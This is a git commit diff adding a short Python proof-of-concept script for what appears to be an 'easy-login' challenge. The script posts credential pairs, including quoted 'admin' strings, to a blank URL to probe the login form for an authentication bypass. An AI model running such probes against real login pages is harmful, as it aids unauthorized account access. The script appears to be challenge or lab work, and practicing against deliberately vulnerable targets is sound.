76979d96874ac1cce733359a466632b385f3edf6
ayoungYoon <166527083+ayoungYoon@users.noreply.github.com>
2025-08-19 06:52:47 +0900

    Update POC.py

--- easy-login/POC/POC.py
+++ easy-login/POC/POC.py
@@ -1,1 +1,18 @@
+import requests
+
+URL = ""
+
+def poc(payload_id, payload_pw):
+    data = {"id": payload_id, "pw": payload_pw}
+    res = requests.post(URL, data=data)
+    print(f"[*] Trying id={payload_id}, pw={payload_pw}")
+    print(res.text)
+    
+
+if __name__ == "__main__":
+    # Case 1
+    poc("1", "1")
+
+    # Case 2
+    poc("'admin'", "'admin'")
 
